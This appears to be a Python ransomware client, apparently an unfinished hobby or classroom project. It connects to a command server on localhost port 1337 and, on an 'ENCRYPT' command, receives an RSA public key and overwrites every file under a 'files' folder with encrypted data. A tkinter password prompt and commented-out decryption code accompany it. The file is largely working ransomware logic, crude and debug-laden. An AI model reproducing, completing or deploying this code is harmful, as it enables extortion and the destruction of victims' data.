from Crypto.PublicKey import RSA
import socket
import keys
import os
import tkinter as tk
import threading
import select

def encrypt(key, input_file):
    encrypted_data = b''
    while True:
        data = input_file.read(64)
        if not data:
            break
        block = keys.encrypt(key, data)
        encrypted_data += block + b'\n'
    return encrypted_data


def decrypt(key, input_file):
    data = input_file.read()
    data = data.split(b'\n')
    input_file.close()
    
    decrypted_data = b''
    for row in data:
        if not row:
            break
        decrypted_data += keys.decrypt(key, row)
    return decrypted_data

def gui():

    window = tk.Tk()

    label_pass = tk.Label(master=window, text="Password:")
    label_pass.pack()
    ent_pass = tk.Entry(master=window, width=50)
    ent_pass.pack()

    def test():
        print('txt:', ent_pass.get())
        ent_pass.delete(0, tk.END)

    btn_submit = tk.Button(master=window, text="Submit", command=test)
    btn_submit.pack(side=tk.RIGHT, padx=10, ipadx=10)

    window.mainloop()


def connection(server_socket):
    
    inputs = [server_socket] # read
    outputs = [server_socket] # write

    i = 0
    while inputs:        
        readable, writable, _ = select.select(inputs, outputs, [])

        for conn in readable:
            message_type = server_socket.recv(64)
            message_type = message_type.decode('utf-8')
            print('msg: ', message_type)

            if message_type == 'ENCRYPT':
                public_key = conn.recv(1024)
                public_key = RSA.importKey(public_key)

                for root, _, files in os.walk('files'):
                    print('asdf')
                    for filename in files:
                        print('ENCRYPT FILE:', filename)
                        
                        input_file = open(root + "/" + filename, 'rb')
                        data = encrypt(public_key, input_file)
                        input_file.close()

                        output_file = open(root + "/" + filename, 'wb')
                        output_file.write(data)
                        output_file.close()

            elif message_type == 'WRONG_PASSWORD':
                pass
            elif message_type == 'CORRECT_PASSWORD':
                pass
            else:
                print('message_type unknown')

            print('the end')

        for conn in writable:
            print('halllååå?!??!?!')

        




# def connection(server_socket):
#     # HOST = '127.0.0.1'
#     # PORT = 1337
    
#     # server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
#     # server_socket.connect((HOST, PORT))
    
#     while True:
#         message_type = server_socket.recv(64)
#         message_type = message_type.decode('utf-8')
#         print('msg: ', message_type)

#         if message_type == 'ENCRYPT':
#             public_key = server_socket.recv(1024)
#             public_key = RSA.importKey(public_key)
            
#             for root, _, files in os.walk('files'):
#                 for filename in files:
#                     print('ENCRYPT FILE:', filename)
                    
#                     input_file = open(root + "/" + filename, 'rb')
#                     data = encrypt(public_key, input_file)
#                     input_file.close()

#                     output_file = open(root + "/" + filename, 'wb')
#                     output_file.write(data)
#                     output_file.close()
#         elif message_type == 'WRONG_PASSWORD':
#             pass
#         elif message_type == 'CORRECT_PASSWORD':
#             pass
#         else:
#             print('message_type unknown')




if __name__ == '__main__':
    HOST = '127.0.0.1'
    PORT = 1337
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    server_socket.connect((HOST, PORT))
    
    
    gui_thread = threading.Thread(target=gui, args=())
    connection_thread = threading.Thread(target=connection, args=(server_socket,))
    
    gui_thread.start()
    connection_thread.start()

    
    
    
       
       


        
        #key = server_socket.recv(4069)


    
    # f = open('private_key.pem', 'rb')
    # #f = open('public_key.pem', 'rb')
    # f = f.read()
    # imported_key = RSA.importKey(f)

    # for root, dirs, files in os.walk('files'):
    #     print(root, dirs, files) 

    #     for filename in files:
    #         print(filename)
            
    #         input_file = open(root + "/" + filename, 'rb')

    #         #data = encrypt(imported_key, input_file)
    #         data = decrypt(imported_key, input_file)
            
    #         input_file.close()

    #         output_file = open(root + "/" + filename, 'wb')
    #         output_file.write(data)
    #         output_file.close()
